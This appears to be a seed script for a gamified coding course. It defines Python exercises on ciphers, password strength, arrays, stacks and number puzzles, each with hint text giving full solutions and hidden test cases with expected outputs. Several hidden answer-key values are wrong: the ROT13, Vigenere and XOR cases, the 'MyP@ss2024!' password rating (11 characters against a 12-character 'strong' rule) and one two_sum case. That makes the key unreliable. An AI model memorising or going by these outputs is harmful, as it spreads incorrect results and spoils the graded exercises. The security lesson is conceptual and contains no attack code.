          { input: 'collatz_steps(1)', expectedOutput: '0', isHidden: false, order: 2 },
          { input: 'collatz_steps(2)', expectedOutput: '1', isHidden: true, order: 3 },
          { input: 'collatz_steps(7)', expectedOutput: '16', isHidden: true, order: 4 },
          { input: 'collatz_steps(27)', expectedOutput: '111', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Leap Year Checker',
        slug: 'leap-year-checker',
        description: 'Write a function `is_leap_year(year)` that takes an integer year and returns `True` if it is a leap year, `False` otherwise. A year is a leap year if: divisible by 4 AND (not divisible by 100 OR divisible by 400). For example, `is_leap_year(2000)` returns `True`, `is_leap_year(1900)` returns `False`.',
        starterCode: `def is_leap_year(year):
    # Return True if year is a leap year
    pass`,
        language: 'python',
        order: 5,
        xpReward: 25,
        hints: [
          { level: 1, content: 'A leap year is divisible by 4, except century years which must be divisible by 400. Use the `%` operator to check divisibility.', xpCost: 5 },
          { level: 2, content: 'Return `year % 4 == 0 and (year % 100 != 0 or year % 400 == 0)`. The parentheses ensure century years are handled correctly.', xpCost: 10 },
          { level: 3, content: 'Complete: `def is_leap_year(y): return y % 4 == 0 and (y % 100 != 0 or y % 400 == 0)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'is_leap_year(2000)', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'is_leap_year(1900)', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'is_leap_year(2024)', expectedOutput: 'True', isHidden: true, order: 3 },
          { input: 'is_leap_year(2023)', expectedOutput: 'False', isHidden: true, order: 4 },
          { input: 'is_leap_year(1600)', expectedOutput: 'True', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Fibonacci Generator',
        slug: 'fibonacci-generator',
        description: 'Write a function `fibonacci(n)` that takes a non-negative integer n and returns the nth Fibonacci number. F(0) = 0, F(1) = 1, F(n) = F(n-1) + F(n-2). For example, `fibonacci(0)` returns `0`, `fibonacci(1)` returns `1`, `fibonacci(10)` returns `55`.',
        starterCode: `def fibonacci(n):
    # Return the nth Fibonacci number
    pass`,
        language: 'python',
        order: 6,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use iteration: start with a=0, b=1. Loop n times, updating a, b = b, a+b. Return a.', xpCost: 5 },
          { level: 2, content: 'Initialize `a, b = 0, 1`. For i in range(n): `a, b = b, a + b`. Return `a`.', xpCost: 10 },
          { level: 3, content: 'Complete: `def fibonacci(n): a, b = 0, 1; for _ in range(n): a, b = b, a + b; return a`', xpCost: 20 },
        ],
        testCases: [
          { input: 'fibonacci(0)', expectedOutput: '0', isHidden: false, order: 1 },
          { input: 'fibonacci(1)', expectedOutput: '1', isHidden: false, order: 2 },
          { input: 'fibonacci(10)', expectedOutput: '55', isHidden: true, order: 3 },
          { input: 'fibonacci(7)', expectedOutput: '13', isHidden: true, order: 4 },
          { input: 'fibonacci(20)', expectedOutput: '6765', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 6

  // Lesson 1.4: Introduction to Cybersecurity
  const lesson1_4 = await createLessonWithExercises(phases[0].id, {
    title: 'Introduction to Cybersecurity',
    slug: 'introduction-to-cybersecurity',
    description: 'Learn the foundational concepts of cybersecurity: the CIA triad, threat landscape, basic cryptography, and why security matters for every developer.',
    contentMdx: `# Introduction to Cybersecurity

Every developer needs to understand cybersecurity — not just security specialists. A single vulnerable line of code can compromise an entire system. This lesson introduces the core concepts that will guide you through the rest of your security journey.

## The CIA Triad

The foundation of all cybersecurity is the **CIA Triad** — three properties that every system must protect:

1. **Confidentiality** — Only authorized parties can access the data. Encryption, access controls, and secure communication channels protect confidentiality.
2. **Integrity** — Data has not been tampered with. Checksums, digital signatures, and hash functions verify integrity.
3. **Availability** — Systems and data are accessible when needed. Redundancy, DDoS protection, and disaster recovery ensure availability.

Every security control maps back to at least one leg of this triad. When you hear about a breach, ask yourself: which leg was compromised?

## The Threat Landscape

Cyber threats come in many forms:

- **Malware**: Viruses, worms, trojans, ransomware — malicious software designed to damage or exploit systems.
- **Phishing**: Social engineering attacks that trick users into revealing credentials or clicking malicious links.
- **Man-in-the-Middle (MitM)**: Attackers intercept communication between two parties who believe they are communicating directly.
- **SQL Injection**: Inserting malicious SQL into input fields to manipulate databases.
- **Zero-day exploits**: Attacks that exploit vulnerabilities before the vendor knows about them.

## Basic Cryptography: The Caesar Cipher

One of the oldest encryption techniques is the **Caesar cipher**, used by Julius Caesar to send secret messages. It works by shifting each letter in the plaintext by a fixed number of positions:

\`\`\`
Plaintext:  A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
Shift +3:   D E F G H I J K L M N O P Q R S T U V W X Y Z A B C
\`\`\`

So "HELLO" with a shift of 3 becomes "KHOOR". While trivially easy to break today, the Caesar cipher teaches the fundamental concept of **encryption**: transforming readable data (plaintext) into unreadable data (ciphertext) using a key (the shift value).

## Password Security

Good password hygiene is your first line of defense:

- **Length matters more than complexity** — a 16-character passphrase beats "P@ssw0rd!"
- **Never reuse passwords** — credential stuffing attacks exploit reused passwords
- **Use a password manager** — generate and store unique, strong passwords
- **Enable multi-factor authentication (MFA)** — add a second verification factor

A strong password checker evaluates length, character diversity (uppercase, lowercase, digits, symbols), and common patterns.

## Why This Matters for Developers

As a developer, you are a **de facto security engineer**. Every feature you build is an attack surface. Every input field is a potential entry point. Understanding these fundamentals is not optional — it is professional responsibility.

In the exercises below, you will implement a Caesar cipher and a password strength checker — your first steps into applied cybersecurity.`,
    order: 4,
    xpReward: 50,
    category: 'cyber',
    exercises: [
      {
        title: 'Caesar Cipher',
        slug: 'caesar-cipher',
        description: 'Write a function `caesar_cipher(text, shift)` that takes a string `text` and an integer `shift`, and returns the encrypted string where each alphabetic character is shifted by `shift` positions. Preserve case and leave non-alphabetic characters unchanged. For example, `caesar_cipher("Hello, World!", 3)` returns `"Khoor, Zruog!"`.',
        starterCode: `def caesar_cipher(text, shift):
    # Shift each letter by 'shift' positions. Preserve case.
    # Non-alphabetic characters remain unchanged.
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Iterate through each character. If it is a letter, determine if it is uppercase or lowercase, then use `ord()` and `chr()` to shift it. The formula for a shifted letter is: `chr((ord(c) - base + shift) % 26 + base)` where `base` is `ord("A")` or `ord("a")`.', xpCost: 5 },
          { level: 2, content: 'For each character c: if c.isalpha(), determine base = ord("A") if c.isupper() else ord("a"), then shifted = chr((ord(c) - base + shift) % 26 + base). Otherwise, keep c unchanged.', xpCost: 10 },
          { level: 3, content: 'Complete: `def caesar_cipher(text, shift): result = ""; [result := result + (chr((ord(c) - (ord("A") if c.isupper() else ord("a")) + shift) % 26 + (ord("A") if c.isupper() else ord("a"))) if c.isalpha() else c) for c in text]; return result` — or better, use a loop for readability.', xpCost: 20 },
        ],
        testCases: [
          { input: 'caesar_cipher("Hello, World!", 3)', expectedOutput: 'Khoor, Zruog!', isHidden: false, order: 1 },
          { input: 'caesar_cipher("abc", 1)', expectedOutput: 'bcd', isHidden: false, order: 2 },
          { input: 'caesar_cipher("XYZ", 3)', expectedOutput: 'ABC', isHidden: true, order: 3 },
          { input: 'caesar_cipher("Hello", 0)', expectedOutput: 'Hello', isHidden: true, order: 4 },
          { input: 'caesar_cipher("ZTD", 5)', expectedOutput: 'EYI', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Password Strength Checker',
        slug: 'password-strength-checker',
        description: 'Write a function `check_password_strength(password)` that returns a strength rating as a string: "weak" (length < 8 or only one character type), "medium" (length >= 8 and 2-3 character types), or "strong" (length >= 12 and all 4 character types: uppercase, lowercase, digits, special chars from "!@#$%^&*").',
        starterCode: `def check_password_strength(password):
    # Return "weak", "medium", or "strong" based on the rules above
    pass`,
        language: 'python',
        order: 2,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Count how many of these 4 character types are present: uppercase letters, lowercase letters, digits, and special characters (!@#$%^&*). Use any() with character checks on the password string.', xpCost: 5 },
          { level: 2, content: 'Calculate: `types = sum([any(c.isupper() for c in password), any(c.islower() for c in password), any(c.isdigit() for c in password), any(c in "!@#$%^&*" for c in password)])`. Then apply the length + type count rules.', xpCost: 10 },
          { level: 3, content: 'After counting types: if len(password) >= 12 and types == 4: return "strong"; elif len(password) >= 8 and types >= 2: return "medium"; else: return "weak"', xpCost: 20 },
        ],
        testCases: [
          { input: 'check_password_strength("abc")', expectedOutput: 'weak', isHidden: false, order: 1 },
          { input: 'check_password_strength("Password1")', expectedOutput: 'medium', isHidden: false, order: 2 },
          { input: 'check_password_strength("Str0ng!Pass#1")', expectedOutput: 'strong', isHidden: true, order: 3 },
          { input: 'check_password_strength("12345678")', expectedOutput: 'weak', isHidden: true, order: 4 },
          { input: 'check_password_strength("MyP@ss2024!")', expectedOutput: 'strong', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'ROT13 Decoder',
        slug: 'rot13-decoder',
        description: 'Write a function `rot13(text)` that takes a string and returns the ROT13 decoded version. ROT13 shifts each letter by 13 positions (wrapping around), preserving case and leaving non-alphabetic characters unchanged. For example, `rot13("Uryyb Jbeyq")` returns `"Hello World"`.',
        starterCode: `def rot13(text):
    # Apply ROT13 decoding to text
    pass`,
        language: 'python',
        order: 3,
        xpReward: 25,
        hints: [
          { level: 1, content: 'ROT13 is a special case of Caesar cipher with shift 13. Since the alphabet has 26 letters, encoding and decoding use the same shift of 13.', xpCost: 5 },
          { level: 2, content: 'For each character c: if c.isalpha(), apply `chr((ord(c) - base + 13) % 26 + base)` where base is ord("A") or ord("a"). Otherwise keep c unchanged.', xpCost: 10 },
          { level: 3, content: 'Complete: same as caesar_cipher with shift=13, or use `import codecs; codecs.decode(text, "rot_13")`', xpCost: 20 },
        ],
        testCases: [
          { input: 'rot13("Uryyb Jbeyq")', expectedOutput: 'Hello World', isHidden: false, order: 1 },
          { input: 'rot13("Hello World")', expectedOutput: 'Uryyb Jbeyq', isHidden: false, order: 2 },
          { input: 'rot13("ZTD{fgbel}")', expectedOutput: 'ZTG{story}', isHidden: true, order: 3 },
          { input: 'rot13("abc123")', expectedOutput: 'nop123', isHidden: true, order: 4 },
          { input: 'rot13("NOP")', expectedOutput: 'ABC', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'XOR Cipher',
        slug: 'xor-cipher',
        description: 'Write a function `xor_cipher(text, key)` that takes a string `text` and a single-character string `key`, and returns the XOR-encrypted result as a string of space-separated hex values. XOR each character of text with the key character. For example, `xor_cipher("A", "\\x01")` returns `"40"` (since ord("A") ^ ord("\\x01") = 64).',
        starterCode: `def xor_cipher(text, key):
    # XOR each character with key and return space-separated hex values
    pass`,
        language: 'python',
        order: 4,
        xpReward: 30,
        hints: [
          { level: 1, content: 'For each character in text, compute `ord(c) ^ ord(key)`, then convert to hex with `format(result, "02x")` or `hex(result)[2:].zfill(2)`.', xpCost: 5 },
          { level: 2, content: 'Build a list: `[format(ord(c) ^ ord(key), "02x") for c in text]`, then join with spaces: `" ".join(list)`', xpCost: 10 },
          { level: 3, content: 'Complete: `def xor_cipher(text, key): return " ".join(format(ord(c) ^ ord(key), "02x") for c in text)`', xpCost: 20 },
        ],
        testCases: [
          { input: 'xor_cipher("A", "\\x01")', expectedOutput: '40', isHidden: false, order: 1 },
          { input: 'xor_cipher("AB", "\\x00")', expectedOutput: '41 42', isHidden: false, order: 2 },
          { input: 'xor_cipher("Hi", "\\xff")', expectedOutput: 'b7 b6', isHidden: true, order: 3 },
          { input: 'xor_cipher("", "\\x01")', expectedOutput: '', isHidden: true, order: 4 },
          { input: 'xor_cipher("X", "X")', expectedOutput: '00', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Vigenere Cipher',
        slug: 'vigenere-cipher',
        description: 'Write a function `vigenere_cipher(text, key)` that takes a plaintext string and a keyword string, and returns the encrypted text using the Vigenere cipher. Each letter in text is shifted by the corresponding letter in key (repeating as needed): shift = ord(key_letter) - ord("A"). Preserve case and leave non-alphabetic characters unchanged. For example, `vigenere_cipher("HELLO", "KEY")` returns `"RIJVS"`.',
        starterCode: `def vigenere_cipher(text, key):
    # Encrypt text using Vigenere cipher with key
    pass`,
        language: 'python',
        order: 5,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Iterate through text and key simultaneously (key repeats). For each letter: shift = ord(key_char.upper()) - ord("A"). Apply Caesar shift with that value. Skip non-alpha characters but advance key index only for alpha chars.', xpCost: 5 },
          { level: 2, content: 'Use key_index = 0. For each char in text: if alpha, compute shift from key[key_index % len(key)], encrypt, increment key_index. If not alpha, keep as-is. Formula: chr((ord(c) - base + shift) % 26 + base).', xpCost: 10 },
          { level: 3, content: 'Complete: track key index separately (only increment for alpha chars). Apply Caesar shift using each key letter as the shift value.', xpCost: 20 },
        ],
        testCases: [
          { input: 'vigenere_cipher("HELLO", "KEY")', expectedOutput: 'RIJVS', isHidden: false, order: 1 },
          { input: 'vigenere_cipher("ABC", "A")', expectedOutput: 'ABC', isHidden: false, order: 2 },
          { input: 'vigenere_cipher("hello", "key")', expectedOutput: 'rijvs', isHidden: true, order: 3 },
          { input: 'vigenere_cipher("ZTD", "ZTD")', expectedOutput: 'OVS', isHidden: true, order: 4 },
          { input: 'vigenere_cipher("Hi!", "AB")', expectedOutput: 'Ij!', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Atbash Cipher',
        slug: 'atbash-cipher',
        description: 'Write a function `atbash_cipher(text)` that takes a string and returns the Atbash-encrypted version. In Atbash, each letter is mapped to its reverse: A↔Z, B↔Y, C↔X, etc. (uppercase stays uppercase, lowercase stays lowercase). Non-alphabetic characters are unchanged. For example, `atbash_cipher("Hello")` returns `"Svool"`.',
        starterCode: `def atbash_cipher(text):
    # Apply Atbash cipher: A<->Z, B<->Y, etc.
    pass`,
        language: 'python',
        order: 6,
        xpReward: 30,
        hints: [
          { level: 1, content: 'For each letter, the Atbash equivalent is: chr(base + 25 - (ord(c) - base)), where base is ord("A") or ord("a"). This mirrors the alphabet.', xpCost: 5 },
          { level: 2, content: 'For uppercase: `chr(ord("A") + 25 - (ord(c) - ord("A")))`. For lowercase: `chr(ord("a") + 25 - (ord(c) - ord("a")))`. Equivalent to `chr(base * 2 + 25 - ord(c))`.', xpCost: 10 },
          { level: 3, content: 'Complete: `def atbash_cipher(t): r=""; [r := r + (chr((ord("A") if c.isupper() else ord("a")) * 2 + 25 - ord(c)) if c.isalpha() else c) for c in t]; return r` — or use a simple loop.', xpCost: 20 },
        ],
        testCases: [
          { input: 'atbash_cipher("Hello")', expectedOutput: 'Svool', isHidden: false, order: 1 },
          { input: 'atbash_cipher("ABC")', expectedOutput: 'ZYX', isHidden: false, order: 2 },
          { input: 'atbash_cipher("ZTD")', expectedOutput: 'AGW', isHidden: true, order: 3 },
          { input: 'atbash_cipher("Test 123!")', expectedOutput: 'Gvhg 123!', isHidden: true, order: 4 },
          { input: 'atbash_cipher("zyx")', expectedOutput: 'abc', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 6

  // ============================================================
  // PHASE 2: DATA STRUCTURES & ALGORITHMS
  // ============================================================

  // Lesson 2.1: Arrays & Strings
  const lesson2_1 = await createLessonWithExercises(phases[1].id, {
    title: 'Arrays & Strings',
    slug: 'arrays-and-strings',
    description: 'Master array operations and string manipulation — the most common data structures you will encounter in interviews, security tools, and real-world code.',
    contentMdx: `# Arrays & Strings

Arrays (called **lists** in Python) and strings are the most fundamental data structures. Nearly every algorithm operates on sequences of data, and nearly every security tool processes strings — from log parsers to payload generators.

## Python Lists

A list is an ordered, mutable collection:

\`\`\`python
nums = [1, 2, 3, 4, 5]
nums.append(6)      # Add to end: [1, 2, 3, 4, 5, 6]
nums.pop()          # Remove from end: [1, 2, 3, 4, 5]
nums[0]             # Access first element: 1
nums[-1]            # Access last element: 5
len(nums)           # Length: 5
\`\`\`

## Common Array Patterns

### Two Pointer Technique

Use two pointers to solve problems efficiently:

\`\`\`python
def two_sum(nums, target):
    seen = {}
    for i, num in enumerate(nums):
        complement = target - num
        if complement in seen:
            return [seen[complement], i]
        seen[num] = i
    return []
\`\`\`

This **hash map approach** gives O(n) time complexity — much better than the naive O(n²) nested loop.

### Sliding Window

Process subarrays efficiently:

\`\`\`python
def max_subarray_sum(nums, k):
    window_sum = sum(nums[:k])
    max_sum = window_sum
    for i in range(k, len(nums)):
        window_sum += nums[i] - nums[i - k]
        max_sum = max(max_sum, window_sum)
    return max_sum
\`\`\`

## String Algorithms

Strings are immutable sequences of characters. Key operations:

\`\`\`python
s = "cybersecurity"
s.count("e")        # 2
s.find("sec")       # 5
s.split("e")        # ["cyb", "rs", "curity"]
"-".join(["a","b"]) # "a-b"
s.replace("sec", "SEC") # "cyberSECurity"
\`\`\`

### Anagram Detection

Two strings are anagrams if they contain the same characters in the same frequencies:

\`\`\`python
from collections import Counter

def is_anagram(s1, s2):
    return Counter(s1.lower()) == Counter(s2.lower())
\`\`\`

## Security Applications

- **Log analysis**: Parse and filter array-structured log entries
- **Payload detection**: Search for malicious string patterns in input
- **Hash comparison**: Compare sorted character frequencies to detect tampering
- **Two Sum**: The same pattern finds matching exploit-signature pairs

Understanding arrays and strings deeply makes you a better programmer and a more effective security analyst.`,
    order: 1,
    xpReward: 60,
    category: 'cs',
    exercises: [
      {
        title: 'Two Sum',
        slug: 'two-sum',
        description: 'Write a function `two_sum(nums, target)` that takes a list of integers and a target integer, and returns a list of two indices whose values add up to the target. You may assume exactly one solution exists and you may not use the same element twice. Return the indices in ascending order.',
        starterCode: `def two_sum(nums, target):
    # Return indices of two numbers that add up to target
    pass`,
        language: 'python',
        order: 1,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use a hash map (dictionary) to store each number and its index as you iterate. For each number, check if `target - num` already exists in the map.', xpCost: 5 },
          { level: 2, content: 'Loop with enumerate: `for i, num in enumerate(nums): complement = target - num; if complement in seen: return [seen[complement], i]; seen[num] = i`', xpCost: 10 },
          { level: 3, content: 'Complete: `def two_sum(nums, target): seen = {}; for i, num in enumerate(nums): c = target - num; if c in seen: return [seen[c], i]; seen[num] = i`', xpCost: 20 },
        ],
        testCases: [
          { input: 'two_sum([2, 7, 11, 15], 9)', expectedOutput: '[0, 1]', isHidden: false, order: 1 },
          { input: 'two_sum([3, 2, 4], 6)', expectedOutput: '[1, 2]', isHidden: false, order: 2 },
          { input: 'two_sum([1, 5, 3, 7], 10)', expectedOutput: '[1, 3]', isHidden: true, order: 3 },
          { input: 'two_sum([0, 4, 3, 0], 0)', expectedOutput: '[0, 3]', isHidden: true, order: 4 },
          { input: 'two_sum([-1, -2, -3, -4, -5], -8)', expectedOutput: '[2, 4]', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Anagram Detector',
        slug: 'anagram-detector',
        description: 'Write a function `is_anagram(s1, s2)` that takes two strings and returns `True` if they are anagrams of each other (same characters, same frequencies, ignoring case), `False` otherwise.',
        starterCode: `def is_anagram(s1, s2):
    # Return True if s1 and s2 are anagrams (case-insensitive)
    pass`,
        language: 'python',
        order: 2,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Normalize both strings to lowercase, then compare their sorted characters or use a frequency counter.', xpCost: 5 },
          { level: 2, content: 'Simplest approach: `return sorted(s1.lower()) == sorted(s2.lower())`', xpCost: 10 },
          { level: 3, content: 'Complete: `def is_anagram(s1, s2): return sorted(s1.lower()) == sorted(s2.lower())`', xpCost: 20 },
        ],
        testCases: [
          { input: 'is_anagram("listen", "silent")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'is_anagram("hello", "world")', expectedOutput: 'False', isHidden: false, order: 2 },
          { input: 'is_anagram("Dormitory", "Dirty room")', expectedOutput: 'False', isHidden: true, order: 3 },
          { input: 'is_anagram("abc", "cba")', expectedOutput: 'True', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Group Anagrams',
        slug: 'group-anagrams',
        description: 'Write a function `group_anagrams(strs)` that takes a list of strings and returns a list of lists, where each inner list contains strings that are anagrams of each other. Group anagrams together, sorted alphabetically within each group, and groups sorted by their first element.',
        starterCode: `def group_anagrams(strs):
    # Group strings that are anagrams of each other
    pass`,
        language: 'python',
        order: 3,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Use a dictionary where the key is a sorted tuple of characters from each word. Anagrams will produce the same sorted tuple.', xpCost: 5 },
          { level: 2, content: 'Create dict `groups = {}`. For each word: `key = tuple(sorted(word))`, append word to `groups[key]`. Then convert values to a list and sort.', xpCost: 10 },
          { level: 3, content: 'Complete: `def group_anagrams(strs): d={}; [d.setdefault(tuple(sorted(w)),[]).append(w) for w in strs]; return sorted([sorted(g) for g in d.values()], key=lambda x: x[0])`', xpCost: 20 },
        ],
        testCases: [
          { input: 'group_anagrams(["eat", "tea", "tan", "ate", "nat", "bat"])', expectedOutput: "[['ate', 'eat', 'tea'], ['bat'], ['nat', 'tan']]", isHidden: false, order: 1 },
          { input: 'group_anagrams(["a"])', expectedOutput: "[['a']]", isHidden: false, order: 2 },
          { input: 'group_anagrams(["abc", "bca", "cab", "xyz", "zyx"])', expectedOutput: "[['abc', 'bca', 'cab'], ['xyz', 'zyx']]", isHidden: true, order: 3 },
          { input: 'group_anagrams([])', expectedOutput: '[]', isHidden: true, order: 4 },
        ],
      },
      {
        title: 'Longest Common Prefix',
        slug: 'longest-common-prefix',
        description: 'Write a function `longest_common_prefix(strs)` that takes a list of strings and returns the longest common prefix string amongst them. If there is no common prefix, return an empty string. For example, `longest_common_prefix(["flower", "flow", "flight"])` returns `"fl"`.',
        starterCode: `def longest_common_prefix(strs):
    # Return the longest common prefix among all strings
    pass`,
        language: 'python',
        order: 4,
        xpReward: 30,
        hints: [
          { level: 1, content: 'If the list is empty, return "". Take the first string as reference. Compare each character position across all strings. Stop when a mismatch is found.', xpCost: 5 },
          { level: 2, content: 'Iterate i from 0 to len(strs[0])-1. For each i, check if all strings have the same character at position i. If not, return strs[0][:i]. If all match, return strs[0][:min_len].', xpCost: 10 },
          { level: 3, content: 'Alternative: use `os.path.commonprefix(strs)` or sort the list and compare only first and last strings (they share the least common prefix).', xpCost: 20 },
        ],
        testCases: [
          { input: 'longest_common_prefix(["flower", "flow", "flight"])', expectedOutput: 'fl', isHidden: false, order: 1 },
          { input: 'longest_common_prefix(["dog", "racecar", "car"])', expectedOutput: '', isHidden: false, order: 2 },
          { input: 'longest_common_prefix(["interspecies", "interstellar", "interstate"])', expectedOutput: 'inters', isHidden: true, order: 3 },
          { input: 'longest_common_prefix(["abc"])', expectedOutput: 'abc', isHidden: true, order: 4 },
          { input: 'longest_common_prefix([])', expectedOutput: '', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Merge Sorted Arrays',
        slug: 'merge-sorted-arrays',
        description: 'Write a function `merge_sorted(arr1, arr2)` that takes two sorted lists of integers and returns a single merged sorted list. Do NOT use sort() — merge them using the two-pointer technique. For example, `merge_sorted([1, 3, 5], [2, 4, 6])` returns `[1, 2, 3, 4, 5, 6]`.',
        starterCode: `def merge_sorted(arr1, arr2):
    # Merge two sorted arrays into one sorted array
    pass`,
        language: 'python',
        order: 5,
        xpReward: 30,
        hints: [
          { level: 1, content: 'Use two pointers i and j starting at 0. Compare arr1[i] and arr2[j], append the smaller one, and advance that pointer. Append remaining elements when one array is exhausted.', xpCost: 5 },
          { level: 2, content: 'Initialize i=j=0, result=[]. While i < len(arr1) and j < len(arr2): if arr1[i] <= arr2[j]: result.append(arr1[i]); i+=1 else: result.append(arr2[j]); j+=1. Then extend with arr1[i:] and arr2[j:].', xpCost: 10 },
          { level: 3, content: 'Complete: two-pointer merge. After the main loop, one list may still have elements — extend them all at once.', xpCost: 20 },
        ],
        testCases: [
          { input: 'merge_sorted([1, 3, 5], [2, 4, 6])', expectedOutput: '[1, 2, 3, 4, 5, 6]', isHidden: false, order: 1 },
          { input: 'merge_sorted([], [1, 2, 3])', expectedOutput: '[1, 2, 3]', isHidden: false, order: 2 },
          { input: 'merge_sorted([1, 2], [])', expectedOutput: '[1, 2]', isHidden: true, order: 3 },
          { input: 'merge_sorted([1, 1, 1], [1, 1])', expectedOutput: '[1, 1, 1, 1, 1]', isHidden: true, order: 4 },
          { input: 'merge_sorted([-3, 0, 7], [-1, 4, 8])', expectedOutput: '[-3, -1, 0, 4, 7, 8]', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'String Compression',
        slug: 'string-compression',
        description: 'Write a function `compress_string(s)` that takes a string and returns a compressed version where consecutive repeated characters are replaced by the character followed by the count. If the compressed string is not shorter than the original, return the original. For example, `compress_string("aaabbbccc")` returns `"a3b3c3"`, `compress_string("abc")` returns `"abc"`.',
        starterCode: `def compress_string(s):
    # Compress string by counting consecutive repeated characters
    pass`,
        language: 'python',
        order: 6,
        xpReward: 35,
        hints: [
          { level: 1, content: 'Iterate through the string counting consecutive same characters. Build a result string of char+count pairs. Compare lengths at the end.', xpCost: 5 },
          { level: 2, content: 'If s is empty, return it. Use a loop: track current char and count. When char changes, append char+str(count) to result. After loop, compare lengths.', xpCost: 10 },
          { level: 3, content: 'Complete: `def compress_string(s): result=""; i=0; while i<len(s): j=i; while j<len(s) and s[j]==s[i]: j+=1; result+=s[i]+str(j-i); i=j; return result if len(result)<len(s) else s`', xpCost: 20 },
        ],
        testCases: [
          { input: 'compress_string("aaabbbccc")', expectedOutput: 'a3b3c3', isHidden: false, order: 1 },
          { input: 'compress_string("abc")', expectedOutput: 'abc', isHidden: false, order: 2 },
          { input: 'compress_string("aabbcc")', expectedOutput: 'aabbcc', isHidden: true, order: 3 },
          { input: 'compress_string("aaaaa")', expectedOutput: 'a5', isHidden: true, order: 4 },
          { input: 'compress_string("")', expectedOutput: '', isHidden: true, order: 5 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 6

  // Lesson 2.2: Linked Lists & Stacks
  const lesson2_2 = await createLessonWithExercises(phases[1].id, {
    title: 'Linked Lists & Stacks',
    slug: 'linked-lists-and-stacks',
    description: 'Understand linked lists, stacks, and how they power fundamental algorithms like expression evaluation and memory management.',
    contentMdx: `# Linked Lists & Stacks

Linked lists and stacks are fundamental data structures that appear everywhere — from memory management in operating systems to call stacks in programming languages to browser history navigation.

## Linked Lists

A linked list is a sequence of **nodes**, where each node contains data and a reference (pointer) to the next node:

\`\`\`python
class Node:
    def __init__(self, val=0, next=None):
        self.val = val
        self.next = next
\`\`\`

Unlike arrays, linked lists:
- **Do not** support random access (no \`list[5]\`)
- **Do** support O(1) insertion and deletion at the head
- Have dynamic size — no need to pre-allocate memory

### Reversing a Linked List

This is one of the most common interview questions. The iterative approach uses three pointers:

\`\`\`python
def reverse_list(head):
    prev = None
    current = head
    while current:
        next_node = current.next
        current.next = prev
        prev = current
        current = next_node
    return prev
\`\`\`

The key insight: we iterate through the list, and at each step, we flip the \`next\` pointer to point backwards instead of forwards.

## Stacks

A stack is a **Last-In, First-Out (LIFO)** data structure. Think of a stack of plates — you add and remove from the top:

\`\`\`python
stack = []
stack.append("a")   # Push
stack.append("b")   # Push
stack.pop()         # Pop -> "b" (last in, first out)
\`\`\`

### Valid Parentheses

Stacks are perfect for matching pairs — like parentheses, HTML tags, or braces:

\`\`\`python
def is_valid(s):
    stack = []
    pairs = {")": "(", "]": "[", "}": "{"}
    for char in s:
        if char in pairs.values():
            stack.append(char)
        elif char in pairs:
            if not stack or stack.pop() != pairs[char]:
                return False
    return len(stack) == 0
\`\`\`

## Real-World Applications

- **Browser history**: Stack of visited pages (back button = pop)
- **Undo/Redo**: Stack of operations
- **Function calls**: The call stack tracks which function returns where
- **Expression evaluation**: Stacks evaluate postfix notation
- **Memory management**: Linked lists manage free memory blocks

In security, understanding stacks is critical for **stack-based buffer overflow** attacks, where an attacker overwrites the return address on the call stack to redirect program execution.`,
    order: 2,
    xpReward: 60,
    category: 'cs',
    exercises: [
      {
        title: 'Valid Parentheses',
        slug: 'valid-parentheses',
        description: 'Write a function `is_valid_parentheses(s)` that takes a string containing only `()`, `{}`, and `[]` brackets, and returns `True` if the brackets are properly matched and nested, `False` otherwise.',
        starterCode: `def is_valid_parentheses(s):
    # Return True if brackets are properly matched
    pass`,
        language: 'python',
        order: 1,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Use a stack. Push opening brackets onto the stack. When you see a closing bracket, pop from the stack and check if it matches.', xpCost: 5 },
          { level: 2, content: 'Map closing brackets to their opening counterparts: `pairs = {")": "(", "]": "[", "}": "{"}`. For each char: if opening, push; if closing, check stack top matches.', xpCost: 10 },
          { level: 3, content: 'Complete: `def is_valid_parentheses(s): stack = []; pairs = {")":"(","]":"[","}":"{"}; [stack.append(c) if c in pairs.values() else (None if not stack or stack.pop() != pairs[c] else None) for c in s]; return len(stack) == 0` — but use a proper loop for clarity.', xpCost: 20 },
        ],
        testCases: [
          { input: 'is_valid_parentheses("()")', expectedOutput: 'True', isHidden: false, order: 1 },
          { input: 'is_valid_parentheses("()[]{}")', expectedOutput: 'True', isHidden: false, order: 2 },
          { input: 'is_valid_parentheses("(]")', expectedOutput: 'False', isHidden: true, order: 3 },
          { input: 'is_valid_parentheses("([)]")', expectedOutput: 'False', isHidden: true, order: 4 },
          { input: 'is_valid_parentheses("{[]}")', expectedOutput: 'True', isHidden: true, order: 5 },
        ],
      },
      {
        title: 'Reverse Linked List',
        slug: 'reverse-linked-list',
        description: 'Write a function `reverse_linked_list(arr)` that takes a list representing a linked list (where each element is a node value in order) and returns the reversed list. For example, `reverse_linked_list([1, 2, 3, 4])` returns `[4, 3, 2, 1]`.',
        starterCode: `def reverse_linked_list(arr):
    # Return the reversed list
    pass`,
        language: 'python',
        order: 2,
        xpReward: 25,
        hints: [
          { level: 1, content: 'Python lists have a built-in reverse method. You can use `arr[::-1]` or `list(reversed(arr))`.', xpCost: 5 },
